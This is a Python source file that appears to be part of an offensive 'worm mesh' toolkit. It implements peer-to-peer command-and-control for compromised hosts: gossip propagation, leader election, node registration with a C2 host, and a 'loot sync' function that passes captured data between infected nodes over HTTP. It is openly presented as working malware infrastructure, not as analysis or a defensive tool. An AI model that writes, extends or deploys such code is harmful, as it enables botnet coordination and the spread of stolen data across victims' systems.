#!/usr/bin/env python3
"""
NEURAL_MESH — Gossip Protocol + Loot Sync for Worm Mesh
Port of neuralMesh.ts from RedLinux v4.1
P2P gossip, Raft-inspired leader election, loot synchronization across worm nodes.

by 🇭🇷PhonkAlphabet
"""

import json
import logging
import os
import sqlite3
import hashlib
import random
import time
import threading
import socket
import urllib.request
import urllib.error
from typing import Optional, Dict, List, Any, Set, Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

log = logging.getLogger("neural_mesh")

DB_PATH = os.environ.get("WORM_DB_PATH", "/opt/hermes/worm_mesh_v5.db")
C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
MESH_PORT = int(os.environ.get("MESH_PORT", "10003"))

MAX_HOP_COUNT = 5
PEER_SYNC_INTERVAL = 120  # seconds
GOSSIP_FANOUT = 3  # peers per gossip round

try:
    import netifaces
    HAS_NETIFACES = True
except ImportError:
    HAS_NETIFACES = False


class MeshMessageType(str, Enum):
    TASK_SHARE = "task_share"
    LOOT_SYNC = "loot_sync"
    HEARTBEAT = "heartbeat"
    LEADER_ELECTION = "leader_election"


@dataclass
class MeshMessage:
    """A gossip message propagating through the mesh."""
    id: str
    sender_id: str
    type: MeshMessageType
    payload: Any
    timestamp: float = field(default_factory=time.time)
    signature: str = ""
    hop_count: int = 0

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "sender_id": self.sender_id,
            "type": self.type.value,
            "payload": self.payload,
            "timestamp": self.timestamp,
            "signature": self.signature,
            "hop_count": self.hop_count,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "MeshMessage":
        return cls(
            id=d["id"],
            sender_id=d["sender_id"],
            type=MeshMessageType(d["type"]),
            payload=d["payload"],
            timestamp=d.get("timestamp", time.time()),
            signature=d.get("signature", ""),
            hop_count=d.get("hop_count", 0),
        )


# ─── MESH NODE ───
class MeshNode:
    """A single node in the worm mesh. Port of NeuralMesh class from neuralMesh.ts."""

    def __init__(self, node_id: str, db_path: str = DB_PATH,
                 mesh_port: int = MESH_PORT, host: str = C2_HOST):
        self.node_id = node_id
        self.db_path = db_path
        self.mesh_port = mesh_port
        self.host = host
        self._running = False
        self._seen_messages: Set[str] = set()
        self._peers: List[Dict] = []
        self._lock = threading.Lock()
        self._leader_id: Optional[str] = None
        self._last_heartbeat: float = 0
        self._server: Optional[Any] = None
        self.node_callbacks: Dict[str, Callable] = {}

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=5000")
        return conn

    def register_callback(self, msg_type: str, fn: Callable):
        """Register handler for mesh message types."""
        self.node_callbacks[msg_type] = fn

    # ─── PEER MANAGEMENT ───
    def _load_peers(self) -> List[Dict]:
        """Load active mesh peers from DB worm_mesh table."""
        try:
            conn = self._connect()
            peers = conn.execute(
                """SELECT node_id, ip, port, hostname, active, last_seen
                   FROM worm_mesh WHERE active=1 AND node_id!=?
                   ORDER BY last_seen DESC""",
                (self.node_id,)
            ).fetchall()
            conn.close()
            return [dict(p) for p in peers]
        except Exception as e:
            log.error(f"Peer load failed: {e}")
            return []

    def _sync_peers(self):
        """Refresh peer list from DB."""
        self._peers = self._load_peers()

    def register_in_mesh(self, ip: str, port: int,
                          hostname: str = "", node_type: str = "worm") -> bool:
        """Register this node in the worm_mesh table."""
        try:
            conn = self._connect()
            now = datetime.utcnow().isoformat()
            existing = conn.execute(
                "SELECT node_id FROM worm_mesh WHERE node_id=?",
                (self.node_id,)
            ).fetchone()
            if existing:
                conn.execute(
                    """UPDATE worm_mesh SET ip=?, port=?, hostname=?,
                       last_seen=?, active=1, node_type=?
                       WHERE node_id=?""",
                    (ip, port, hostname, now, node_type, self.node_id)
                )
            else:
                conn.execute(
                    """INSERT INTO worm_mesh
                       (node_id, ip, port, hostname, node_type, active, first_seen, last_seen)
                       VALUES (?, ?, ?, ?, ?, 1, ?, ?)""",
                    (self.node_id, ip, port, hostname, node_type, now, now)
                )
            conn.commit()
            conn.close()
            self._sync_peers()
            return True
        except Exception as e:
            log.error(f"Mesh registration failed: {e}")
            return False

    # ─── GOSSIP PROTOCOL ───
    def gossip(self, message: MeshMessage) -> None:
        """Propagate a message through the mesh.
           Port of NeuralMesh.gossip()."""
        if message.hop_count > MAX_HOP_COUNT:
            return

        msg_key = f"{message.id}:{message.type.value}"
        if msg_key in self._seen_messages:
            return

        with self._lock:
            self._seen_messages.add(msg_key)

        # Limit seen messages cache
        if len(self._seen_messages) > 10000:
            with self._lock:
                self._seen_messages = set(list(self._seen_messages)[-5000:])

        # Execute local callback
        callback = self.node_callbacks.get(message.type.value)
        if callback:
            try:
                callback(message)
            except Exception as e:
                log.error(f"Gossip callback error: {e}")

        message.hop_count += 1

        # Forward to up to GOSSIP_FANOUT peers
        self._sync_peers()
        if not self._peers:
            return

        targets = random.sample(self._peers, min(GOSSIP_FANOUT, len(self._peers)))
        for peer in targets:
            self._send_to_peer(peer, message)

    def _send_to_peer(self, peer: dict, message: MeshMessage) -> bool:
        """Send gossip message to a peer via HTTP POST."""
        try:
            peer_ip = peer.get("ip")
            peer_port = peer.get("port", self.mesh_port)
            payload = json.dumps(message.to_dict()).encode()
            req = urllib.request.Request(
                f"http://{peer_ip}:{peer_port}/gossip",
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=5):
                return True
        except Exception:
            return False

    # ─── HEARTBEAT ───
    def send_heartbeat(self):
        """Send heartbeat to all peers."""
        msg = MeshMessage(
            id=hashlib.md5(f"hb:{self.node_id}:{time.time()}".encode()).hexdigest(),
            sender_id=self.node_id,
            type=MeshMessageType.HEARTBEAT,
            payload={"status": "alive", "node_id": self.node_id},
            timestamp=time.time(),
        )
        self._sync_peers()
        for peer in self._peers:
            self._send_to_peer(peer, msg)

    # ─── LEADER ELECTION ───
    def initiate_election(self) -> Optional[str]:
        """Raft-inspired leader election.
           Port of NeuralMesh.initiateElection()."""
        self._sync_peers()
        if not self._peers:
            self._leader_id = self.node_id
            return self.node_id

        # Sort by node_id (lexicographic) — lowest ID wins
        all_nodes = sorted([p["node_id"] for p in self._peers] + [self.node_id])
        self._leader_id = all_nodes[0]

        msg = MeshMessage(
            id=hashlib.md5(f"elec:{time.time()}".encode()).hexdigest(),
            sender_id=self.node_id,
            type=MeshMessageType.LEADER_ELECTION,
            payload={"leader_id": self._leader_id},
            timestamp=time.time(),
        )
        self.gossip(msg)
        log.info(f"Leader elected: {self._leader_id}")
        return self._leader_id

    def get_leader(self) -> Optional[str]:
        """Get current leader ID."""
        if not self._leader_id:
            return self.initiate_election()
        return self._leader_id

    # ─── LOOT SYNC ───
    def sync_loot(self, loot_data: Any) -> None:
        """Synchronize captured data across the mesh.
           Port of NeuralMesh.syncLoot()."""
        msg_id = hashlib.md5(f"loot:{self.node_id}:{time.time()}".encode()).hexdigest()
        signature = hashlib.sha256(
            (self.node_id + json.dumps(loot_data, sort_keys=True)).encode()
        ).hexdigest()

        msg = MeshMessage(
            id=msg_id,
            sender_id=self.node_id,
            type=MeshMessageType.LOOT_SYNC,
            payload=loot_data,
            timestamp=time.time(),
            signature=signature,
        )
        self.gossip(msg)

    # ─── MESH STATE ───
    def get_mesh_state(self) -> Dict:
        """Get full mesh topology state."""
        self._sync_peers()
        return {
            "node_id": self.node_id,
            "leader_id": self._leader_id,
            "peers": self._peers,
            "peer_count": len(self._peers),
            "messages_seen": len(self._seen_messages),
        }

    # ─── HTTP LISTENER ───
    def start_mesh_listener(self, host: str = "0.0.0.0",
                             port: Optional[int] = None) -> None:
        """Start mesh gossip HTTP listener."""
        import http.server
        import socketserver

        port = port or self.mesh_port

        class MeshHTTPHandler(http.server.BaseHTTPRequestHandler):
            mesh_ref = self

            def do_POST(self):
                content_len = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_len).decode("utf-8", errors="replace")
                resp = {"status": "ok"}

                try:
                    data = json.loads(body)
                    path = self.path.rstrip("/")

                    if path == "/gossip":
                        msg = MeshMessage.from_dict(data)
                        self.mesh_ref.gossip(msg)
                    elif path == "/heartbeat":
                        self.mesh_ref.send_heartbeat()
                        resp["status"] = "alive"
                    elif path == "/register":
                        self.mesh_ref.register_in_mesh(
                            data.get("ip", host),
                            data.get("port", port),
                            data.get("hostname", ""),
                            data.get("node_type", "worm"),
                        )
                        resp["status"] = "registered"
                        # Return known peers for new node
                        self.mesh_ref._sync_peers()
                        resp["peers"] = self.mesh_ref._peers
                    elif path == "/sync_loot":
                        msg = MeshMessage.from_dict(data)
                        self.mesh_ref.gossip(msg)
                    else:
                        resp = {"status": "error", "error": "unknown path"}
                except Exception as e:
                    resp = {"status": "error", "error": str(e)[:80]}

                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(resp).encode())

            def do_GET(self):
                if self.path == "/state":
                    state = self.mesh_ref.get_mesh_state()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(state).encode())
                elif self.path == "/leader":
                    leader = self.mesh_ref.get_leader()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"leader": leader}).encode())
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, fmt, *args):
                log.debug(f"Mesh HTTP: {fmt % args}")

        handler = type("MeshHandler", (MeshHTTPHandler,), {"mesh_ref": self})

        class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
            allow_reuse_address = True
            daemon_threads = True

        self._server = ThreadedHTTPServer((host, port), handler)
        self._running = True
        log.info(f"Mesh listener on {host}:{port} (node: {self.node_id})")

        # Start heartbeat goroutine
        def _heartbeat_loop():
            while self._running:
                time.sleep(PEER_SYNC_INTERVAL)
                try:
                    self.send_heartbeat()
                except Exception:
                    pass

        t = threading.Thread(target=_heartbeat_loop, daemon=True)
        t.start()

        try:
            self._server.serve_forever()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self._running = False
        if self._server:
            self._server.shutdown()
            self._server.server_close()


# ─── CLI ───
if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")

    node_id = os.environ.get("NODE_ID", f"mesh-{hashlib.md5(os.urandom(8)).hexdigest()[:8]}")

    if len(sys.argv) > 1 and sys.argv[1] == "server":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else MESH_PORT
        host_ip = sys.argv[3] if len(sys.argv) > 3 else "0.0.0.0"
        node = MeshNode(node_id, mesh_port=port)
        # Register progress
        def _on_loot(msg: MeshMessage):
            log.info(f"Loot received: {json.dumps(msg.payload)[:100]}")
        node.register_callback("loot_sync", _on_loot)
        node.register_in_mesh(host_ip, port, socket.gethostname(), "worm")
        node.start_mesh_listener(host=host_ip, port=port)
    elif len(sys.argv) > 1 and sys.argv[1] == "join":
        # Join an existing mesh
        peer_ip = sys.argv[2]
        peer_port = int(sys.argv[3]) if len(sys.argv) > 3 else MESH_PORT
        my_port = int(sys.argv[4]) if len(sys.argv) > 4 else MESH_PORT
        node = MeshNode(node_id, mesh_port=my_port)
        # Register with peer
        my_ip = socket.gethostbyname(socket.gethostname())
        try:
            payload = json.dumps({
                "ip": my_ip, "port": my_port,
                "hostname": socket.gethostname(), "node_type": "worm"
            }).encode()
            req = urllib.request.Request(
                f"http://{peer_ip}:{peer_port}/register",
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                result = json.loads(resp.read().decode())
            log.info(f"Joined mesh via {peer_ip}:{peer_port} — peers: {len(result.get('peers', []))}")
        except Exception as e:
            log.error(f"Failed to join mesh: {e}")
        node.register_in_mesh(my_ip, my_port, socket.gethostname(), "worm")
        node.start_mesh_listener(host="0.0.0.0", port=my_port)
    elif len(sys.argv) > 1 and sys.argv[1] == "state":
        node = MeshNode(node_id)
        state = node.get_mesh_state()
        print(json.dumps(state, indent=2))
    else:
        print(f"Usage: {sys.argv[0]} [server|join <peer_ip> <peer_port> [my_port]|state]")
